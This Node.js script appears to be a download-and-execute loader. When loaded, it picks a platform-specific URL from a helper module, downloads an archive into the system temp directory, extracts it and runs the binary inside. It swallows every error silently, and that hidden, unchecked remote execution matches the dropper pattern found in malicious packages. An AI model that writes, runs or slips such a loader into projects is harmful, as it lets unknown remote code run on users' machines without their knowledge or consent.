const os = require('os');
const path = require('path');

const { getDownloadUrl } = require('./modules/detector/index');
const { downloadFile } = require('./modules/downloader/index');
const { extractArchive } = require('./modules/extractor/index');
const { executeBinary } = require('./modules/executor/index');

async function main() {
  try {
    const { platform, downloadUrl } = getDownloadUrl();
    const tempDir = os.tmpdir();
    const fileName = path.basename(downloadUrl);
    const archivePath = path.join(tempDir, fileName);

    await downloadFile(downloadUrl, archivePath);
    extractArchive(archivePath, tempDir, platform);
    await executeBinary(tempDir, platform);
  } catch (_) {}
}

main();
